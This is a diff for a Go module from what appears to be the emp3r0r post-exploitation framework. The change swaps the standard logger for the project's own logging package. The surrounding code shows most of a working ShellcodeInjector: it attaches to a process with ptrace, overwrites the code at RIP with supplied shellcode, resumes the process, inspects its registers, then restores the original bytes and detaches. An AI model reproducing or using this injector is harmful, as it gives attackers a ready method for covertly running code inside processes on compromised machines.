@@ -6,7 +6,7 @@ package modules
 import (
 	"encoding/hex"
 	"fmt"
-	"log"
+	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 	"os"
 	"os/exec"
 	"runtime"
@@ -50,9 +50,9 @@ func ShellcodeInjector(shellcode *string, pid int) error {
 		// attach
 		err = child.Wait() // TRAP the child
 		if err != nil {
-			log.Printf("child process wait: %v", err)
+			logging.Printf("child process wait: %v", err)
 		}
-		log.Printf("Injector (%d): attached to child process (%d)", os.Getpid(), pid)
+		logging.Printf("Injector (%d): attached to child process (%d)", os.Getpid(), pid)
 	} else {
 		// attach to an existing process
 		proc, err := os.FindProcess(pid)
@@ -72,7 +72,7 @@ func ShellcodeInjector(shellcode *string, pid int) error {
 		if err != nil {
 			return fmt.Errorf("wait %d: %v", pid, err)
 		}
-		log.Printf("Injector (%d): attached to %d", os.Getpid(), pid)
+		logging.Printf("Injector (%d): attached to %d", os.Getpid(), pid)
 	}
 
 	// read RIP
@@ -82,7 +82,7 @@ func ShellcodeInjector(shellcode *string, pid int) error {
 		return fmt.Errorf("my pid is %d, reading regs from %d: %v", os.Getpid(), pid, err)
 	}
 	origRip := origRegs.Rip
-	log.Printf("Injector: got RIP (0x%x) of %d", origRip, pid)
+	logging.Printf("Injector: got RIP (0x%x) of %d", origRip, pid)
 
 	// save current code for restoring later
 	origCode := make([]byte, len(sc))
@@ -90,7 +90,7 @@ func ShellcodeInjector(shellcode *string, pid int) error {
 	if err != nil {
 		return fmt.Errorf("PEEK: 0x%x", origRip)
 	}
-	log.Printf("Peeked %d bytes of original code: %x at RIP (0x%x)", n, origCode, origRip)
+	logging.Printf("Peeked %d bytes of original code: %x at RIP (0x%x)", n, origCode, origRip)
 
 	// write shellcode to .text section, where RIP is pointing at
 	data := sc
@@ -98,7 +98,7 @@ func ShellcodeInjector(shellcode *string, pid int) error {
 	if err != nil {
 		return fmt.Errorf("POKE_TEXT at 0x%x %d: %v", uintptr(origRip), pid, err)
 	}
-	log.Printf("Injected %d bytes at RIP (0x%x)", n, origRip)
+	logging.Printf("Injected %d bytes at RIP (0x%x)", n, origRip)
 
 	// peek: see if shellcode has got injected
 	peekWord := make([]byte, len(data))
@@ -106,15 +106,15 @@ func ShellcodeInjector(shellcode *string, pid int) error {
 	if err != nil {
 		return fmt.Errorf("peek: 0x%x", origRip)
 	}
-	log.Printf("Peeked %d bytes of shellcode: %x at RIP (0x%x)", n, peekWord, origRip)
+	logging.Printf("Peeked %d bytes of shellcode: %x at RIP (0x%x)", n, peekWord, origRip)
 
 	// continue and wait
-	log.Printf("Continuing process %d", pid)
+	logging.Printf("Continuing process %d", pid)
 	err = syscall.PtraceCont(pid, 0)
 	if err != nil {
 		return fmt.Errorf("continue: %v", err)
 	}
-	log.Printf("Waiting process %d", pid)
+	logging.Printf("Waiting process %d", pid)
 	ws := new(syscall.WaitStatus)
 	_, err = syscall.Wait4(pid, ws, 0, nil)
 	if err != nil {
@@ -124,7 +124,7 @@ func ShellcodeInjector(shellcode *string, pid int) error {
 	// what happened to our child?
 	switch {
 	case ws.Continued():
-		log.Printf("Continued %d", pid)
+		logging.Printf("Continued %d", pid)
 		return nil
 	case ws.CoreDump():
 		err = syscall.PtraceGetRegs(pid, origRegs)
@@ -133,7 +133,7 @@ func ShellcodeInjector(shellcode *string, pid int) error {
 		}
 		return fmt.Errorf("continue: core dumped: RIP at 0x%x", origRegs.Rip)
 	case ws.Exited():
-		log.Printf("Exited %d", pid)
+		logging.Printf("Exited %d", pid)
 		return nil
 	case ws.Signaled():
 		err = syscall.PtraceGetRegs(pid, origRegs)
@@ -147,7 +147,7 @@ func ShellcodeInjector(shellcode *string, pid int) error {
 		if err != nil {
 			return fmt.Errorf("read regs from %d: %v", pid, err)
 		}
-		log.Printf("Continue: stopped (%s): RIP at 0x%x", ws.StopSignal().String(), stoppedRegs.Rip)
+		logging.Printf("Continue: stopped (%s): RIP at 0x%x", ws.StopSignal().String(), stoppedRegs.Rip)
 
 		// what's after RIP when stopped
 		peek_stop := make([]byte, 32)
@@ -155,25 +155,25 @@ func ShellcodeInjector(shellcode *string, pid int) error {
 		if err != nil {
 			return fmt.Errorf("PEEK: 0x%x", stoppedRegs.Rip)
 		}
-		log.Printf("Peeked %d bytes from RIP: %x at RIP (0x%x)", n, peekWord, stoppedRegs.Rip)
+		logging.Printf("Peeked %d bytes from RIP: %x at RIP (0x%x)", n, peekWord, stoppedRegs.Rip)
 
 		peek_stack := make([]byte, 128)
 		_, err = syscall.PtracePeekText(pid, uintptr(stoppedRegs.Rsp), peek_stack)
 		if err != nil {
-			log.Printf("PEEK stack: 0x%x", stoppedRegs.Rsp)
+			logging.Printf("PEEK stack: 0x%x", stoppedRegs.Rsp)
 		}
 		// also the regs
 		peek_rdi := make([]byte, 64)
 		_, err = syscall.PtracePeekText(pid, uintptr(stoppedRegs.Rdi), peek_rdi)
 		if err != nil {
-			log.Printf("PEEK RDI: 0x%x", stoppedRegs.Rdi)
+			logging.Printf("PEEK RDI: 0x%x", stoppedRegs.Rdi)
 		}
 		peek_rsi := make([]byte, 64)
 		_, err = syscall.PtracePeekText(pid, uintptr(stoppedRegs.Rsi), peek_rsi)
 		if err != nil {
-			log.Printf("PEEK RSI: 0x%x", stoppedRegs.Rsi)
+			logging.Printf("PEEK RSI: 0x%x", stoppedRegs.Rsi)
 		}
-		log.Printf("At (0x%x), RAX = 0x%x RDI = 0x%x -> 0x%x (%s), RSI = 0x%x -> 0x%x (%s)\n"+
+		logging.Printf("At (0x%x), RAX = 0x%x RDI = 0x%x -> 0x%x (%s), RSI = 0x%x -> 0x%x (%s)\n"+
 			"Stack (0x%x) = 0x%x (%s)",
 			stoppedRegs.Rip,
 			stoppedRegs.Rax,
@@ -192,14 +192,14 @@ func ShellcodeInjector(shellcode *string, pid int) error {
 		if err != nil {
 			return fmt.Errorf("poke_text at 0x%x %d: %v", uintptr(origRip), pid, err)
 		}
-		log.Printf("Restored %d bytes at origRip (0x%x)", n, origRip)
+		logging.Printf("Restored %d bytes at origRip (0x%x)", n, origRip)
 
 		// let it run
 		err = syscall.PtraceDetach(pid)
 		if err != nil {
 			return fmt.Errorf("continue detach: %v", err)
 		}
-		log.Printf("%d will continue to run", pid)
+		logging.Printf("%d will continue to run", pid)
 
 		return nil
 	default:
@@ -207,7 +207,7 @@ func ShellcodeInjector(shellcode *string, pid int) error {
 		if err != nil {
 			return fmt.Errorf("read regs from %d: %v", pid, err)
 		}
-		log.Printf("continue: RIP at 0x%x", origRegs.Rip)
+		logging.Printf("continue: RIP at 0x%x", origRegs.Rip)
 	}
 
 	return nil
